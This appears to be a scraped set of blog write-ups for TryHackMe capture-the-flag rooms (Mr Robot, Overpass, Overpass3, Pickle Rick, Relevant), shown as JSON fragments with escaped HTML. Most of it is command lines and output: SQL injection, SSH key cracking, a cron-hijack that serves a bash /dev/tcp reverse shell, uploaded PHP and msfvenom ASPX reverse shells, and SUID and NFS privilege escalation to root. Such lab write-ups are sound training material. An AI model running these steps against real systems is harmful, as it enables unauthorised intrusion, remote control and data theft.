robot@linux:~$ find / -perm -u=s \u0026gt; /dev/null\nrobot@linux:~$ find / -perm -u=s -type f 2\u0026gt;/dev/null find / -perm -u=s -type f 2\u0026gt;/dev/null /bin/ping /bin/umount /bin/mount /bin/ping6 /bin/su /usr/bin/passwd /usr/bin/newgrp /usr/bin/chsh /usr/bin/chfn /usr/bin/gpasswd /usr/bin/sudo /usr/local/bin/nmap /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper /usr/lib/pt_chown only nmap looks any interesting. This article explains what I am trying to replicate here.\nrobot@linux:~$ nmap -V nmap -V nmap version 3.81 ( http://www.insecure.org/nmap/ ) website name as insecure :D\nrobot@linux:~$ nmap --interactive nmap --interactive Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ ) Welcome to Interactive Mode -- press h \u0026lt;enter\u0026gt; for help nmap\u0026gt; ls ls Unknown command (ls) -- press h \u0026lt;enter\u0026gt; for help nmap\u0026gt; !sh !sh # ls ls key-2-of-3.txt password.raw-md5 # whoami whoami root pwned!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/gsFux0D.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-mr-robot-writeup/","title":"TryHackMe: Mr Robot Writeup"},{"content":"1. Recon 1.1 Port Scanning ❯ nmap -sC -sV -A BOX_IP Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-02 22:56 EST Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 49.58% done; ETC: 22:56 (0:00:23 remaining) Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 66.33% done; ETC: 22:57 (0:00:20 remaining) Nmap scan report for BOX_IP Host is up (0.41s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA) | 256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA) |_ 256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Overpass Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 91.19 seconds PS: you can run this with --script=vuln, and that works too. But, it took this amount of time: Nmap done: 1 IP address (1 host up) scanned in 1216.13 seconds. So maybe not a good idea.\n1.2 Web Enumeration ❯ gobuster dir -u BOX_IP -w \u0026quot;/usr/share/wordlists/rockyou.txt\u0026quot; -x \u0026quot;html,php,txt\u0026quot; =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://BOX_IP [+] Threads: 10 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: html,php,txt [+] Timeout: 10s =============================================================== 2021/02/02 23:06:26 Starting gobuster =============================================================== /index.html (Status: 301) /img (Status: 301) /downloads (Status: 301) /aboutus (Status: 301) /admin (Status: 301) /admin.html (Status: 200) /css (Status: 301) Progress: 1322 / 220561 (0.60%)^C [!] Keyboard interrupt detected, terminating. =============================================================== 2021/02/02 23:12:32 Finished =============================================================== 1.3 SQLI hmmm. admin look interesting. Using /admin.html gives us a login page.\nlets try a basic sql injection: 69 OR 1=1\n\u0026hellip;\nworks!\nokay so name of the person is james and \u0026hellip; we have the ssh private key printed out lmao.\n2. Foothold lets try:\n❯ ssh -i key james@BOX_IP\n key: the rsa key james: the username BOX_IP: IP address of the box.  password protected ;-; ok so lets take that key and convert it into a better format.\npython ssh2john.py id_rsa \u0026gt; id_rsa.hash\ntime to brute-forcing!\n❯ john hash -wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/ciphers [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 4 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press 'q' or Ctrl-C to abort, almost any other key for status ******* (key) Warning: Only 2 candidates left, minimum 4 needed for performance. 1g 0:00:00:07 DONE (2021-02-02 23:49) 0.1385g/s 1986Kp/s 1986Kc/s 1986KC/sa6_123..*7¡Vamos! Session completed key hidden :)\n❯ ssh -i key james@BOX_IP Enter passphrase for key 'key': I\u0026rsquo;m in!\n3. PrivEsc james@overpass-prod:~$ cat todo.txt To Do: \u0026gt; Update Overpass' Encryption, Muirland has been complaining that it's not strong enough \u0026gt; Write down my password somewhere on a sticky note so that I don't forget it. Wait, we make a password manager. Why don't I just use that? \u0026gt; Test Overpass for macOS, it builds fine but I'm not sure it actually works \u0026gt; Ask Paradox how he got the automated build script working and where the builds go. They're not updating on the website ok so lets copy linpeas to find any issues:\n❯ scp -i path/to/key /path/to/linpeas.sh james@BOX_IP:/destination/path\nnow,\njames@overpass-prod:~$ chmod +x linpeas.sh james@overpass-prod:~$ ./linpeas.sh hmm. so we have /etc/hosts available to edit\njames@overpass-prod:~$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 overpass-prod 127.0.1.1 overpass.thm # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters and since there\u0026rsquo;s some talk about automated build scipts, we should go look at cron.\njames@overpass-prod:~$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # Update builds from latest code * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash ah yeas. look at the last one. it runs every minute, as root. only if we could change the hosting location of overpass.thm \u0026hellip; oh wait\nso lets edit /etc/hosts\u0026rsquo;s overpass.thm to our own ip, and setup a python server using:\n❯ sudo python3 -m http.server 80 [sudo] password for tanishq: Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... note the port 80 since that curl is going to look in the default port. Now, wherever you started this server, from this location onwards, we need to have this exact structure /downloads/src/buildscript.sh, so\n ❯ mkdir downloads ❯ cd downloads ❯ mkdir src ❯ cd src ❯ echo \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/MY_IP/4242 0\u0026gt;\u0026amp;1\u0026quot; \u0026gt; buildscript.sh  this lets us pretend to be a server, serving that buildscript.sh file :)\nwe are telling the sever to send us a tcp connection to our own ip on the port 4242.\nMeanwhile, setup netcat using:\n❯ nc -nlvp 4242\n -l: listen mode, for inbound connects -n: numeric-only IP addresses, no DNS -v: verbose [use twice to be more verbose] -p port: local port number  and we are all in!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/LPggi78.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-overpass-writeup/","title":"TryHackMe: Overpass Writeup"},{"content":"1. Recon we run the nmap scan and the gobuster parallely, while we explore the website.\n1.1 Port Scanning ❯ nmap -script=vuln -sV -A -T4 -Pn 10.10.16.10 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-06 21:54 EST Nmap scan report for 10.10.16.10 Host is up (0.52s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 |_sslv2-drown: 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) 80/tcp open http Apache httpd 2.4.37 ((centos)) |_http-csrf: Couldn't find any CSRF vulnerabilities. |_http-dombased-xss: Couldn't find any DOM based XSS. | http-enum: | /backups/: Backup folder w/ directory listing |_ /icons/: Potentially interesting folder w/ directory listing |_http-server-header: Apache/2.4.37 (centos) |_http-stored-xss: Couldn't find any stored XSS vulnerabilities. |_http-trace: TRACE is enabled Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 97.52 seconds 1.2 Web Enumeration + Exploration ❯ gobuster dir -u 10.10.16.10 -w \u0026quot;/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\u0026quot; -x \u0026quot;html,php,txt\u0026quot;\nwell this didn\u0026rsquo;t workout well. But, from the nmap scan, we have two directories listed:\n/backups/ \u0026amp; /icons/\n/icons/ did not have anything interesting, so lets look at /backups/. We have a zip file as backup.zip. Downloading and unzipping,\n❯ unzip backup.zip Archive: backup.zip extracting: CustomerDetails.xlsx.gpg inflating: priv.key ❯ gpg --import priv.key gpg: key C9AE71AB3180BC08: \u0026quot;Paradox \u0026lt;paradox@overpass.thm\u0026gt;\u0026quot; not changed gpg: key C9AE71AB3180BC08: secret key imported gpg: Total number processed: 1 gpg: unchanged: 1 gpg: secret keys read: 1 gpg: secret keys unchanged: 1 ❯ gpg CustomerDetails.xlsx.gpg gpg: WARNING: no command supplied. Trying to guess what you mean ... gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08 \u0026quot;Paradox \u0026lt;paradox@overpass.thm\u0026gt;\u0026quot; Nice, we have all the customer details neatly bundled up for us. Now, lets convert the xlsx to pdf.\nSo we have some customer names and their username-password combinations and, some credit card information XD\n1.3 FTP lets try logging in using this from ftp. paradox username works! okay okay. lets try putting a file on the server using put filename. So that works too. Lets upload a php reverse shell and see how that works. Don\u0026rsquo;t forget to change the $ip to your tun0, or the relevant tun.\n❯ ftp 10.10.181.222 ... ftp\u0026gt; pwd 257 \u0026quot;/\u0026quot; is the current directory ftp\u0026gt; put phpreverseshell.php ... ftp\u0026gt; ls ... -rw-r--r-- 1 1001 1001 5494 Mar 07 03:10 phpreverseshell.php 226 Directory send OK. 2. Foothold Setup netcat to listen on the port specified. I did not change so its 1337 for me.\n❯ nc -lnvp 1337\nSo, lets execute the shell on there. How? just curl!\n❯ curl 10.10.16.10/shell.php\n❯ nc -lnvp 1337 listening on [any] 1337 ... connect to [10.8.150.214] from (UNKNOWN) [10.10.181.222] 38004 Linux localhost.localdomain 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 03:12:19 up 17 min, 0 users, load average: 0.00, 0.41, 0.89 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=48(apache) gid=48(apache) groups=48(apache) sh: cannot set terminal process group (874): Inappropriate ioctl for device sh: no job control in this shell sh-4.4$ whoami whoami apache sh-4.4$ pwd / pwd sh-4.4$ 3. Priv Esc let\u0026rsquo;s first get the web flag:\nsh-4.4$ cd ~ cd ~ sh-4.4$ ls ls error icons noindex web.flag sh-4.4$ cat web.flag cat web.flag thm{NOICE} sh-4.4$ Converting to a python shell using python3 -c \u0026quot;import pty; pty.spawn('/bin/bash')\u0026quot;, lets focus on privesc.\nbash-4.4$ su paradox su paradox Password: {mmm_tasty} [paradox@localhost html]$ whoami whoami paradox Since we can transfer files using ftp, we can put in linpeas.sh\n[+] Searching ssl/ssh files /home/paradox/.ssh/authorized_keys /home/paradox/.ssh/id_rsa.pub /usr/bin/passwd Possible private SSH keys were found! /home/paradox/priv.key [+] NFS exports? [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe /home/james *(rw,fsid=0,sync,no_root_squash,insecure) Files with capabilities: /usr/bin/newgidmap = cap_setgid+ep /usr/bin/newuidmap = cap_setuid+ep /usr/bin/ping = cap_net_admin,cap_net_raw+p /usr/sbin/arping = cap_net_raw+p /usr/sbin/clockdiff = cap_net_raw+p /usr/sbin/suexec = cap_setgid,cap_setuid+ep Okay. the NFS thing was full red in color. Why no_root_squash is not a good idea. We have lots of scope there. To find out what port its running on, we can look at the nmap scan results. However, we can\u0026rsquo;t see it there. It must be filtered or blocked. In any case, we can look for it, by:\n[paradox@localhost home]$ rpcinfo -p program vers proto port service 100000 4 tcp 111 portmapper 100000 3 tcp 111 portmapper 100000 2 tcp 111 portmapper 100000 4 udp 111 portmapper 100000 3 udp 111 portmapper 100000 2 udp 111 portmapper 100024 1 udp 49444 status 100024 1 tcp 45735 status 100005 1 udp 20048 mountd 100005 1 tcp 20048 mountd 100005 2 udp 20048 mountd 100005 2 tcp 20048 mountd 100005 3 udp 20048 mountd 100005 3 tcp 20048 mountd 100003 3 tcp 2049 nfs 100003 4 tcp 2049 nfs 100227 3 tcp 2049 nfs_acl 100021 1 udp 56460 nlockmgr 100021 3 udp 56460 nlockmgr 100021 4 udp 56460 nlockmgr 100021 1 tcp 32803 nlockmgr 100021 3 tcp 32803 nlockmgr 100021 4 tcp 32803 nlockmgr Its at the port 2049, which is the default for NFS.\n❯ ssh paradox@10.10.181.222 -L 2049:localhost:2049 Enter passphrase for key '/home/tanishq/.ssh/id_rsa': Last login: Sun Mar 7 04:22:48 2021 from 10.8.150.214 [paradox@localhost ~]$ ❯ sudo mount -v -t nfs localhost:/ /home/tanishq/mnt mount.nfs: timeout set for Sun Mar 7 00:12:57 2021 mount.nfs: trying text-based options 'vers=4.2,addr=::1,clientaddr=::1' total 1228 drwx------ 3 tanishq tanishq 124 Mar 7 00:36 . drwxr-xr-x 33 tanishq tanishq 4096 Mar 7 00:36 .. -rwxr-xr-x 1 root root 1234376 Mar 7 00:36 bash lrwxrwxrwx 1 root root 9 Nov 8 16:45 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 tanishq tanishq 18 Nov 8 2019 .bash_logout -rw-r--r-- 1 tanishq tanishq 141 Nov 8 2019 .bash_profile -rw-r--r-- 1 tanishq tanishq 312 Nov 8 2019 .bashrc drwx------ 2 tanishq tanishq 61 Nov 7 21:20 .ssh -rw------- 1 tanishq tanishq 38 Nov 17 16:15 user.flag ❯ cat id_rsa \u0026gt;\u0026gt; /relevant/path/here/james.key\n❯ chmod 600 james.key ❯ ssh -i james.key james@10.10.179.112 Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145 [james@localhost ~]$ [james@localhost ~]$ ls bash user.flag [james@localhost ~]$ ./bash ./bash: /lib64/libtinfo.so.6: no version information available (required by ./bash) bash-5.1$ whoami james bash-5.1$ ./bash -p ./bash: /lib64/libtinfo.so.6: no version information available (required by ./bash) bash-5.1# whoami root :D\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/ElTbvct.jpg","permalink":"https://chaudhary1337.github.io/p/tryhackme-overpass3-writeup/","title":"TryHackMe: Overpass3 Writeup"},{"content":"1. Recon lets look at the website first. Okay. Nothing special. Looking at the source we have something in the comments:\n \u0026lt;!-- Note to self, remember username! Username: R1ckRul3s --\u0026gt; nice. lets try running gobuster meanwhile, along with nmap.\n❯ nmap -script=default -sV -A -T4 10.10.106.44 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 21:19 EST Nmap scan report for 10.10.106.44 Host is up (0.18s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ac:a3:87:da:73:ba:1a:d5:e1:22:6a:2a:8b:e5:47:be (RSA) | 256 b7:59:da:b6:2a:7f:b4:2b:89:f5:b1:13:76:ef:a6:d7 (ECDSA) |_ 256 fc:8d:ba:fa:d8:72:41:b7:d5:1b:c7:06:0c:ca:a4:1d (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Rick is sup4r cool Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.35 seconds ❯ gobuster dir -u 10.10.106.44 -w \u0026quot;/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\u0026quot; -x \u0026quot;html,php,txt\u0026quot; =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.106.44 [+] Threads: 10 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: html,php,txt [+] Timeout: 10s =============================================================== 2021/02/17 21:20:31 Starting gobuster =============================================================== /index.html (Status: 200) /login.php (Status: 200) /assets (Status: 301) /portal.php (Status: 302) okay. very interesting stuff. let\u0026rsquo;s try it one by one.\nassets/ show\nrobots.txt shows another interesting word.\ninterestingly, when i go to portal.php, it redirects me to login.php. Maybe there is something there? lets see it in burpsuite.\nNothing. a simple redirect. Okay so lets only look at login.php. Maybe there is an XSS attack we care looking at \u0026hellip; nope. tried and didnt work.\nBut what if \u0026hellip; we have both the username and the password already with us? :D\n2. Foothold So we have a command pannel and we can execute stuff. hmmm.\nAnd, we are at the portal.php page. gg.\nls\nSup3rS3cretPickl3Ingred.txt assets clue.txt denied.php index.html login.php portal.php robots.txt so denied is \u0026hellip; well something we should expect to pop onto us as an error soon.\nIt also looks like the cat command is disabled. So, lets try alternatives \u0026hellip; less works!\nless clue.txt: Look around the file system for the other ingredient.\nokay \u0026hellip;\nless Sup3rS3cretPickl3Ingred.txt: *** ******* ****\neww, but yay!\nOkay. so now i\u0026rsquo;m trying to cd .. but it doesn\u0026rsquo;t wanna work. we did have the ssh port open, so \u0026hellip;\n❯ ssh R1ckRul3s@10.10.106.44 The authenticity of host '10.10.106.44 (10.10.106.44)' can't be established. ECDSA key fingerprint is SHA256:LWuQ+4VfPBKeYlbudgcUF9iFM6hG7u/vjzjziKLavsk. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.106.44' (ECDSA) to the list of known hosts. R1ckRul3s@10.10.106.44: Permission denied (publickey). so first we need to put our public key in the list of ssh\u0026rsquo;s authorized_keys file. But how do we get in \u0026hellip;?\nLet\u0026rsquo;s try settup up nc and get a bash reverse shell going on. Get your own ip by ❯ ifconfig tun0. I\u0026rsquo;m taking the reverse shells from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n❯ nc -lnvp 4242 listening on [any] 4242 ... hmm. bash gives nothing. let\u0026rsquo;s try perl.\n3. Priviledge Escalation So perl reverse shell works! Now, let\u0026rsquo;s upgrade our shell by $ python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\nwww-dataÄip-10-10-106-44:/home/rick$ whoami whoami www-data www-dataÄip-10-10-106-44:/home/ubuntu$ ls -la ls -la total 40 drwxr-xr-x 4 ubuntu ubuntu 4096 Feb 10 2019 . drwxr-xr-x 4 root root 4096 Feb 10 2019 .. -rw------- 1 ubuntu ubuntu 320 Feb 10 2019 .bash_history -rw-r--r-- 1 ubuntu ubuntu 220 Aug 31 2015 .bash_logout -rw-r--r-- 1 ubuntu ubuntu 3771 Aug 31 2015 .bashrc drwx------ 2 ubuntu ubuntu 4096 Feb 10 2019 .cache -rw-r--r-- 1 ubuntu ubuntu 655 May 16 2017 .profile drwx------ 2 ubuntu ubuntu 4096 Feb 10 2019 .ssh -rw-r--r-- 1 ubuntu ubuntu 0 Feb 10 2019 .sudo_as_admin_successful -rw------- 1 ubuntu ubuntu 4267 Feb 10 2019 .viminfo We could try ssh into the system for a proper shell, but I want to check if we have some low hanging fruits here. That is, do we have root permissions?\nexploring, we have:\nwww-dataÄip-10-10-106-44:/home/rick$ ls -la ls -la total 12 drwxrwxrwx 2 root root 4096 Feb 10 2019 . drwxr-xr-x 4 root root 4096 Feb 10 2019 .. -rwxrwxrwx 1 root root 13 Feb 10 2019 second ingredients www-data@ip-10-10-86-16:/home/rick$ cat 'second ingredients' cat 'second ingredients' * ***** **** :stonks: 1 jerry tear wait what\nwww-data@ip-10-10-86-16:/home/rick$ sudo -l sudo -l Matching Defaults entries for www-data on ip-10-10-86-16.eu-west-1.compute.internal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ip-10-10-86-16.eu-west-1.compute.internal: (ALL) NOPASSWD: ALL so we have all the permissions without password lmao\nso much for \u0026lsquo;priv esc\u0026rsquo; XD\nwww-data@ip-10-10-86-16:/$ sudo ls /root/ sudo ls /root/ 3rd.txt snap www-data@ip-10-10-86-16:/$ sudo cat /root/3rd.txt sudo cat /root/3rd.txt 3rd ingredients: ***** ***** PWNED!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/NLn7Ikj.jpg","permalink":"https://chaudhary1337.github.io/p/tryhackme-pickle-rick-writeup/","title":"TryHackMe: Pickle Rick Writeup"},{"content":"Play\n1. Enumeration \u0026amp; Exploration Note: All of the below may look sequential, but are done is parallel.\n1.1 Port Scanning Not shown: 995 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: RELEVANT | NetBIOS_Domain_Name: RELEVANT | NetBIOS_Computer_Name: RELEVANT | DNS_Domain_Name: Relevant | DNS_Computer_Name: Relevant | Product_Version: 10.0.14393 |_ System_Time: 2021-05-27T05:21:09+00:00 | ssl-cert: Subject: commonName=Relevant | Issuer: commonName=Relevant | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2021-05-26T05:14:40 | Not valid after: 2021-11-25T05:14:40 | MD5: 9663 1f81 95f5 9ab8 6fb0 1d05 4847 e090 |_SHA-1: b94f 8149 8420 d35a c4f2 9bb4 969c b983 6844 bb29 |_ssl-date: 2021-05-27T05:21:48+00:00; +3s from scanner time. Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1h24m03s, deviation: 3h07m50s, median: 3s | smb-os-discovery: | OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3) | Computer name: Relevant | NetBIOS computer name: RELEVANT\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2021-05-26T22:21:10-07:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-05-27T05:21:11 |_ start_date: 2021-05-27T05:15:11 Let\u0026rsquo;s also run a full, all ports scan.\nPORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 49663/tcp open unknown 49668/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown For ports 49663-49670 we need to run another scan to see exactly what is going on.\nPORT STATE SERVICE VERSION 49663/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server 49664/tcp filtered unknown 49665/tcp filtered unknown 49666/tcp filtered unknown 49667/tcp filtered unknown 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Sneaky! 49663 is our next target, after 80.\n1.2. Web Exploration + Enumeration On port 80, The gobuster scan results nothing.\nOn port 49663, Same webpage. The gobuster scan again results nothing. Clearly, this is not the path to take.\n1.3. SMB ┌──(kali㉿kali)-[~] └─$ smbclient -L 10.10.64.0 -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC nt4wrksv Disk SMB1 disabled -- no workgroup available The last share looks interesting.\n┌──(kali㉿kali)-[/tmp] └─$ smbclient //10.10.64.0/nt4wrksv -N Try \u0026quot;help\u0026quot; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sat Jul 25 17:46:04 2020 .. D 0 Sat Jul 25 17:46:04 2020 passwords.txt A 98 Sat Jul 25 11:15:33 2020 7735807 blocks of size 4096. 4949166 blocks available smb: \\\u0026gt; get passwords.txt getting file \\passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) smb: \\\u0026gt; Looks delicious.\n┌──(kali㉿kali)-[/tmp] └─$ cat passwords.txt [User Passwords - Encoded] {hidden} {hidden} Looks like base64 encoded. Using psexec, we can check their strength.\n┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples] └─$ python3 psexec.py '{user1}':'{pass1}'@10.10.64.0 Impacket v0.9.23.dev1+20210519.170900.2f5c2476 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on 10.10.64.0..... [-] share 'ADMIN$' is not writable. [-] share 'C$' is not writable. [*] Found writable share nt4wrksv [*] Uploading file bZoikejy.exe [*] Opening SVCManager on 10.10.64.0..... [-] Error opening SVCManager on 10.10.64.0..... [-] Error performing the installation, cleaning up: Unable to open SVCManager Looks like user1 is the right username, but the password is wrong. user2 on the other hand,\n┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples] └─$ python3 psexec.py '{user2}':'{pass2}'@10.10.64.0 Impacket v0.9.23.dev1+20210519.170900.2f5c2476 - Copyright 2020 SecureAuth Corporation [-] Authenticated as Guest. Aborting 1.4. SMB + Web A common thing to note is that the shares are shared, and can be seen over the web server. Let\u0026rsquo;s try looking for the nt4wrksv share on both the ports.\nGreat! If we can put stuff in smb somehow, we should be solid. Now, the question is, how?\n┌──(kali㉿kali)-[~/Desktop/tools/files] └─$ smbclient //10.10.64.0/nt4wrksv -N Try \u0026quot;help\u0026quot; to get a list of possible commands. smb: \\\u0026gt; put test.txt putting file test.txt as \\test.txt (0.1 kb/s) (average 0.1 kb/s) smb: \\\u0026gt; Intersting! Now the question is, what kind of shell does microsoft use for these serivces?\nExploiting Microsoft IIS with Metasploit explores in depth.\nWe create a payload using msfvenom and start listening.\n┌──(kali㉿kali)-[/tmp] └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.8.184 LPORT=1337 -f asp -o rev.asp [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of asp file: 53168 bytes Saved as: rev.asp ┌──(kali㉿kali)-[~] └─$ nc -lvnp 1337 listening on [any] 1337 ... Uploading,\n┌──(kali㉿kali)-[/tmp] └─$ smbclient //10.10.64.0/nt4wrksv -N Try \u0026quot;help\u0026quot; to get a list of possible commands. smb: \\\u0026gt; put rev.asp putting file rev.asp as \\rev.asp (25.8 kb/s) (average 25.8 kb/s) smb: \\\u0026gt; and going to the page, we get an error, which redirects us to this microsoft link. This talks about how asp is not installed by default.\nLooking it up, it looks like we need to get aspx instead.\n2. Foothold Let\u0026rsquo;s do it again.\n┌──(kali㉿kali)-[/tmp] └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.8.184 LPORT=1337 -f aspx -o rev.aspx [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of aspx file: 3416 bytes Saved as: rev.aspx ┌──(kali㉿kali)-[/tmp] └─$ smbclient //10.10.64.0/nt4wrksv -N Try \u0026quot;help\u0026quot; to get a list of possible commands. smb: \\\u0026gt; put rev.aspx putting file rev.aspx as \\rev.aspx (2.7 kb/s) (average 2.7 kb/s) smb: \\\u0026gt; And \u0026hellip;\n┌──(kali㉿kali)-[~] └─$ nc -lvnp 1337 listening on [any] 1337 ... connect to [10.17.8.184] from (UNKNOWN) [10.10.64.0] 49897 Spawn Shell... Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. c:\\windows\\system32\\inetsrv\u0026gt; We are in!\n3. PrivEsc c:\\windows\\system32\\inetsrv\u0026gt;whoami whoami iis apppool\\defaultapppool c:\\windows\\system32\\inetsrv\u0026gt;whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeAuditPrivilege Generate security audits Disabled 